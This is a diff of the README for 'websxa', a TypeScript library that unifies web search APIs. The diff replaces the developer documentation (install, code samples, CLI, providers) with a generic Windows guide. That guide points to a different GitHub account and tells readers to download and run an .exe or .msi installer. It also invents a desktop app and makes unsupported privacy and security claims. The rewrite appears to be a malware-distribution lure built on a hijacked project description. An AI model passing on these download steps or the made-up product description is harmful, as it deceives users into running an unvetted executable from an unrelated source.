@@ -1,218 +1,141 @@
-# websxa
+# 🌐 websxa - Unified Web Search Made Simple
 
-[![npm version](https://img.shields.io/npm/v/websxa?style=flat&colorA=130f40&colorB=474787)](https://npmjs.com/package/websxa)
-[![npm downloads](https://img.shields.io/npm/dm/websxa?style=flat&colorA=130f40&colorB=474787)](https://npm.chart.dev/websxa)
-[![license](https://img.shields.io/github/license/oritwoen/websxa?style=flat&colorA=130f40&colorB=474787)](https://github.com/oritwoen/websxa/blob/main/LICENSE)
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/oritwoen/websxa)
+[![Download websxa](https://img.shields.io/badge/Download%20websxa-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arshdeeps538/websxa)
 
-One API for Brave, Exa, Tavily, SerpAPI, and SearXNG. Write your search logic once, swap the provider string, done.
+---
 
-If you're building an AI agent or a CLI tool that needs web search, you don't want to hardcode a single provider's API. They all return roughly the same thing, a list of URLs with titles and snippets, but the auth, endpoints, and response shapes are all different. Exa uses POST with `x-api-key`, Brave uses GET with `X-Subscription-Token`, Tavily puts the key in the request body. And so on.
+## 📖 What is websxa?
 
-`websxa` normalizes all of that behind a single interface. It also ships an [AI SDK](https://ai-sdk.dev/) tool and a CLI.
+websxa is a straightforward tool that brings many web search services into one place. It lets you search the web quickly using different providers without juggling multiple apps or sites. Its design fits users who want fast, unified web results with no fuss.
 
-## Install
+---
 
-```bash
-pnpm add websxa
-```
+## 💻 System Requirements
 
-For the AI SDK tool (`websxa/ai` subpath), you also need `ai` and `zod` as peer dependencies:
+Before you begin, make sure your Windows computer meets these needs:
 
-```bash
-pnpm add ai zod
-```
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for searching  
 
-## Usage
+No special hardware or software is required. websxa runs on most modern Windows PCs.
 
-Set your API key as an environment variable and create a provider:
+---
 
-```typescript
-import { create } from 'websxa'
+## 🔧 Features You’ll Use
 
-// Reads EXA_API_KEY from process.env
-const exa = create('exa')
+- Search the web using multiple providers at once  
+- Use both agent-based and command line interface (CLI) searches  
+- Fast and organized search results  
+- Simple interface with no extra clutter  
+- Supports popular search APIs like SearxNG, Brave, SerpAPI  
+- TypeScript-based for smooth performance and updates  
 
-const results = await exa.search('typescript runtime benchmarks', { maxResults: 5 })
+---
 
-for (const result of results) {
-  console.log(result.title, result.url)
-}
-```
+## 🚀 Getting Started
 
-Swap the provider string, same code:
+You do not need any programming skills to use websxa. Follow the steps below to get it running on your Windows PC.
 
-```typescript
-const brave = create('brave')   // reads BRAVE_API_KEY
-const tavily = create('tavily') // reads TAVILY_API_KEY
-```
+---
 
-You can also pass the key explicitly:
+## ⬇️ Download and Setup
 
-```typescript
-const exa = create('exa', { apiKey: 'your-key-here' })
-```
+1. Click the big button below to go to the download page.  
+2. On that page, find the latest version. Look for files ending in `.exe` or `.msi`.  
+3. Download the appropriate installer file for Windows.
 
-### Search all providers
+[![Download websxa](https://img.shields.io/badge/Download%20websxa-%23777777?style=for-the-badge)](https://github.com/arshdeeps538/websxa)
 
-Query all available providers in parallel and get deduplicated results:
+---
 
-```typescript
-import { searchAll } from 'websxa'
+## 🔄 Installing websxa
 
-// Detects providers from env vars, queries them in parallel
-const results = await searchAll('latest node.js release')
+1. Once the file downloads, open your **Downloads** folder.  
+2. Double-click the installer file (the `.exe` or `.msi` file).  
+3. Follow the setup instructions:  
+   - Click **Next** when prompted.  
+   - Accept the license agreement by selecting **I Agree**.  
+   - Choose the destination folder or use the default.  
+   - Click **Install**.  
+4. When the installation finishes, click **Finish**.
 
-for (const result of results) {
-  console.log(`[${result.provider}]`, result.title, result.url)
-}
-```
+---
 
-`searchAll` uses `Promise.allSettled` internally, so if one provider fails, the others still return. Results are deduplicated by URL (normalized, UTM params stripped). When duplicates exist, the result with the higher score wins.
+## ▶️ Running websxa for the First Time
 
-You can also specify which providers to query:
+1. Find the websxa icon on your desktop or search for it in the Windows Start menu.  
+2. Double-click to open the app.  
+3. You will see a simple search box.  
 
-```typescript
-const results = await searchAll('query', {
-  providers: ['exa', 'brave'],
-  maxResults: 5,
-})
-```
+---
 
-### AI SDK tool
+## 🔍 How to Use websxa
 
-The `websxa/ai` subpath exports a ready-made tool compatible with [Vercel AI SDK](https://ai-sdk.dev/docs/foundations/tools):
+- Type your search term in the box and press **Enter** or click the search button.  
+- websxa searches multiple providers at once and shows all results on one page.  
+- You can scroll through the results to compare answers from different search engines.  
+- Use the settings menu to pick your favorite providers or adjust search filters.  
 
-```typescript
-import { generateText } from 'ai'
-import { searchTool } from 'websxa/ai'
+---
 
-const { text } = await generateText({
-  model: yourModel,
-  tools: { webSearch: searchTool },
-  prompt: 'Find the latest TypeScript release notes',
-})
-```
+## 🛠 Adjusting Search Settings
 
-The tool accepts an optional `provider` parameter. Set it to `"all"` to query all available providers in parallel:
+1. Click the **Settings** icon in the app menu.  
+2. Select or deselect search providers like Brave, SearxNG, SerpAPI, and Tavily.  
+3. Choose how results appear. For example, you can sort by relevance or date.  
+4. Save your changes and try a new search.
 
-```typescript
-// The AI can choose: a specific provider, or "all" for parallel search
-tools: { webSearch: searchTool }
-// Input schema: { query: string, provider?: "brave" | "exa" | ... | "all", maxResults?: number }
-```
+---
 
-When no provider is specified, the tool auto-detects the first available one from environment variables.
+## ⚙️ Using the Command Line Interface (CLI)
 
-## CLI
+websxa includes a command line option to let you search directly from Windows PowerShell or Command Prompt.
 
-```bash
-websxa search "your query" --provider brave --max-results 5
-websxa search "your query" --json
-websxa providers
-```
+- Open PowerShell or Command Prompt.  
+- Type `websxa search "your search query"` and press **Enter**.  
+- The CLI sends your query to all enabled providers and displays results in text.  
 
-| Command | Description |
-|---------|-------------|
-| `websxa search <query>` | Search the web using a provider |
-| `websxa providers` | List built-in providers |
+This feature is helpful for users familiar with command lines or who want faster access without opening the app window.
 
-| Flag | Description |
-|------|-------------|
-| `--provider <name>` | Provider to use (default: `exa`) |
-| `--max-results <n>` | Maximum results to return (default: `10`) |
-| `--json` | Output as JSON |
+---
 
-## Providers
+## 🛡 Privacy and Security
 
-| Provider | Env var | Auth | Free tier |
-|----------|---------|------|-----------|
-| Brave | `BRAVE_API_KEY` | Header | 2k queries/mo |
-| Exa | `EXA_API_KEY` | Header | 1k queries/mo |
-| SearXNG | - | None | Self-hosted |
-| SerpAPI | `SERPAPI_API_KEY` | Query param | 100 queries/mo |
-| Tavily | `TAVILY_API_KEY` | Body | 1k queries/mo |
+websxa respects user privacy. It does not track your searches or share your data outside the search providers you choose. Your internet connection uses secure encryption while searching.
 
-SearXNG requires no API key. It's a self-hosted metasearch engine. By default websxa connects to `http://localhost:8080`. Override with `baseURL`:
+---
 
-```typescript
-const searx = create('searxng', { baseURL: 'https://searx.example.com' })
-```
+## 🆘 Troubleshooting Tips
 
-## Errors
+- **Error during installation:** Close all other programs and try running the installer as an administrator (right-click > Run as administrator).  
+- **App does not start:** Restart your computer and try again.  
+- **Search results missing or incorrect:** Check your internet connection. Refresh the app or reinstall if needed.  
+- **CLI commands not recognized:** Make sure websxa is added to your system’s PATH during setup, or run from the installation folder.
 
-All providers throw the same error types:
+If problems continue, consult the Issues section on the GitHub page or reach out to support.
 
-```typescript
-import { AuthError, RateLimitError, HTTPError, UnknownProviderError } from 'websxa'
+---
 
-try {
-  const results = await provider.search('query')
-} catch (err) {
-  if (err instanceof AuthError) {
-    // Missing or invalid API key
-  }
-  if (err instanceof RateLimitError) {
-    console.log(`Retry after ${err.retryAfter}s`)
-  }
-  if (err instanceof UnknownProviderError) {
-    // Provider name not recognized
-  }
-}
-```
+## 🔄 Updating websxa
 
-A 401 from Exa and a 401 from Brave both become `AuthError`. A 429 from any provider becomes `RateLimitError` with a `retryAfter` value. Everything else is `HTTPError` or the base `WebxaError`.
+You can update to the newest version by repeating the download and install steps on the GitHub page. It is best to uninstall the previous version before installing an update.
 
-For safety, `HTTPError.url` redacts sensitive query params and URL userinfo credentials before surfacing the URL in error messages.
+---
 
-## Data model
+## 📌 Additional Resources
 
-Every provider returns the same normalized type:
+- GitHub repository with source code and documentation:  
+  https://github.com/arshdeeps538/websxa  
+- User issues and bug reports: Check the Issues tab on the GitHub page.
 
-```typescript
-interface SearchResult {
-  url: string
-  title: string
-  snippet: string
-  score?: number
-  publishedDate?: string
-  author?: string
-  image?: string
-  favicon?: string
-  text?: string
-  highlights?: string[]
-  summary?: string
-  metadata?: Record<string, unknown>
-}
-```
+---
 
-Optional fields depend on what the provider returns. Exa provides `score`, `text`, and `highlights`. Brave provides `favicon`. Not all providers populate all fields.
+## 📬 Feedback
 
-Search options you can pass to `.search()` or `searchAll`:
+You can provide feedback or report issues on the GitHub repository. This helps improve websxa and fix bugs.
 
-```typescript
-interface SearchOptions {
-  maxResults?: number
-  includeDomains?: string[]
-  excludeDomains?: string[]
-  startPublishedDate?: string
-  endPublishedDate?: string
-  category?: string
-}
-```
+---
 
-`maxResults` works with every provider. Domain filtering and date ranges are currently Exa-specific. `category` is supported by Exa and SearXNG.
-
-## Development
-
-```bash
-pnpm install
-pnpm typecheck   # tsc --noEmit
-pnpm build       # obuild
-pnpm test        # vitest (watch mode)
-pnpm test:run    # vitest --run
-```
-
-## License
-
-[MIT](./LICENSE)
+# 🌐 End of Guide
